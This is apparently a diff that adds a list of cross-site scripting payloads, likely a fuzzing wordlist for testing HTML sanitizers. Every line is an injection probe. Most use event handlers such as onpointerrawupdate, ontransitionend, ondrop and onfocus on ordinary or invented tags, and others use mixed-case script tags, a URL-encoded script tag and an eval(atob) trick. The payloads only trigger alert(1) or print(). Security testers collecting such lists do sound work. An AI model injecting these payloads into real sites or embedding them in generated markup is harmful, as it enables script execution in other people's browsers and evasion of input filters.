@@ -1,0 +1,31 @@
+<a onpointerout=alert(1) style=display:block>XSS</a>
+<a onpointerrawupdate=alert(1) style=display:block>XSS</a>
+<area onpointerleave=alert(1) style=display:block>XSS</area>
+<reslut onmouseover="alert(1)" style=display:block>test</reslut>
+<reslut onmouseup="alert(1)" style=display:block>test</reslut>
+<div draggable="true" contenteditable>drag me</div><nav ondrop=alert(1) contenteditable style=display:block>drop here</nav>
+<div draggable="true" contenteditable>drag me</div><nextid ondragover=alert(1) contenteditable style=display:block>drop here</nextid>
+<div draggable="true" contenteditable>drag me</div><nobr ondrop=alert(1) contenteditable style=display:block>drop here</nobr>
+<i draggable="true" ondragleave="alert(1)" style=display:block>test</i>
+<i id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></i>
+<i id=x tabindex=1 onfocus=alert(1)></i>
+<scRiPt>alErt(1)</sCrIpt>
+<image3 onpointerleave=alert(1) style=display:block>XSS</image3>
+<image3 onpointerrawupdate=alert(1) style=display:block>XSS</image3>
+<image3 onpointerup=alert(1) style=display:block>XSS</image3>
+<img contenteditable onbeforeinput=alert(1)>test
+<img draggable="true" ondrag="alert(1)" style=display:block>test</img>
+<img id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></img>
+<style>:target {color: red;}</style><section id=x style="transition:color 10s" ontransitioncancel=print()></section>
+<style>:target {color: red;}</style><set id=x style="transition:color 10s" ontransitioncancel=print()></set>
+<var onpointerover=alert(1) style=display:block>XSS</var>
+<var onpointerrawupdate=alert(1) style=display:block>XSS</var>
+<var onpointerup=alert(1) style=display:block>XSS</var>
+<video autoplay controls onseeked=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video autoplay controls onseeking=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<xmp onpointerleave=alert(1) style=display:block>XSS</xmp>
+<xmp onpointermove=alert(1) style=display:block>XSS</xmp>
+<xss id=x tabindex=1 onfocus=alert(1)></xss>
+<xss id=x tabindex=1 onfocusin=alert(1)></xss>
+<>%3Cscript%3Ealert(1)%3C/script%3E
+eval(atob`alert(1)`)
